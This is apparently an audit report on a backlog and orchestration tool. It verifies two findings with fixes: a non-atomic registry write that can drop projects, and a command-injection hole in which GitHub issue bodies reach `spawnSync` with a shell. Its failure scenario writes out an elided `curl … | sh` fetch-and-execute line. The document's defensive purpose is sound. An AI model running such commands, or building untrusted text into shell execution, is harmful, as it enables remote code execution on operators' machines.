Important | bugs | skills/backlog/tools/backlog.mjs:74 | `registerProject` treats any registry read or parse failure as an empty registry and then overwrites the file with only the current project. A corrupt file, or a torn read while another `init`/`new` is writing it, silently removes every other project from the board | The catch at 74-76 says "corrupt file — start fresh". Line 84 writes with plain `fs.writeFileSync` (truncate, then write; not atomic), so a concurrent capture in a second repo can read a half-written file. orchestrate.mjs already uses temp-file plus rename (`writeRunAtomic`, :720) for the same reason.

**Failure scenario.** Two `backlog-capture` sessions in two repos call `new` at the same moment. One truncates `registry.json` while the other reads it; the reader hits a `JSON.parse` error, falls into "corrupt file — start fresh", and writes a registry holding only its own project. Every other project vanishes from the board (and the server refuses tracker writes for now-unregistered projects) until each one captures again. Fix: temp-file + rename (as `writeRunAtomic` already does), and on a parse failure refuse/back up instead of starting fresh.

**Verification (UPHELD).** In backlog.mjs:69-85, any read or JSON.parse failure falls into the empty catch at 74-76 and leaves `registry = { projects: [] }`. Line 84 then calls plain `fs.writeFileSync` with no temp file, no rename, no backup and no lock. So a corrupt file, or a read that catches another writer mid-truncate, gets overwritten with only the current project, and only a message for a failed write reaches stderr (`registerBestEffort`, 256-267). This is not a first-init-only path: `registerBestEffort` runs on every `init`, on both `new` paths (2312, 2364) and on import (3356), so concurrent captures in two repos both hit this read-modify-write. The invariants.md single-writer rule only says no other tool writes the file; it does not stop two `backlog.mjs` processes running at once. The import comment at 3353 says the server refuses writes to unregistered projects, so dropped projects lose that too. The one mitigation is that each dropped project re-registers on its next capture. orchestrate.mjs:720-726 does use temp-file-plus-rename, as the auditor says.

Important | security | skills/backlog-orchestrate/tools/orchestrate.mjs:5284 | In a tracker (GitHub) project, the unattended `verify` step runs shell commands taken from the GitHub issue body. On a public repo the issue's author, any GitHub user, can edit that body after a maintainer has queued the issue and get arbitrary code run on the operator's machine. | `runVerifyCommand` calls `spawnSync(cmd, { shell: true, ... })`. The commands come from `resolveVerifyCommands`, which `cmdVerify` calls at :5324 and which reads the item's `## Done when` fenced lines (:5228, :1306). For a tracker project those lines come from the snapshot that `writeSnapshot` re-fetches live at :2319 (`GET /api/items/body?path=gh:...`), and that route returns `issue.issue.body` unchanged (server/src/items/sources/github.source.ts:175). The snapshot is rewritten after every fix loop, so a body edited while a run is going still reaches the shell.

**Failure scenario.** A tracker project on a public repo; a maintainer grooms and queues an issue opened by an outside contributor. During the run (after the gate checks commands once), the issue author edits `## Done when` to add `curl … | sh`. The driver re-writes the snapshot after a fix loop, `verify` reads the new fenced line and runs it via `spawnSync(cmd, { shell: true })` on the operator's machine, unattended. Fix options: pin the body at gate time (hash/`updated_at`) and refuse a changed one; or re-run `findUnresolvedCommands` against the snapshot before `verify` and refuse anything not in verify.json/package.json; optionally gate on `author_association`.

**Verification (UPHELD).** Checked line by line: `itemDoneWhenCommands` (orchestrate.mjs:5166-5181) reads `## Done when` fenced lines from the tracker snapshot, `resolveVerifyCommands` adds them to the command list (:5228), and `runVerifyCommand` runs each one with `spawnSync(cmd, { shell: true })` (:5285). The snapshot comes from `writeSnapshot` (:2314-2335), which fetches `GET /api/items/body` live, and that route returns `issue.issue.body` unchanged (github.source.ts:175). `inspect` writes the snapshot (:4119) and SKILL.md:713 and :837 tell the driver to write it again after every fix loop. The only check on these commands is `detectQuestions`/`findUnresolvedCommands` (:1319, :1364): it runs when items are gated, flags any command not in verify.json or package.json as needs-answers, and is never run again on the snapshot. Nothing checks the author or `author_association`, there is no allowlist for Done-when commands, and the body is not pinned by hash or `updated_at`. No threat model in invariants.md, .claude/rules/security.md or the tracker spec's §11 accepts this, and the docs do plan for public repos (invariants.md:3014). One wording fix: the issue's author (or a repo collaborator) can make that edit, not any GitHub user.
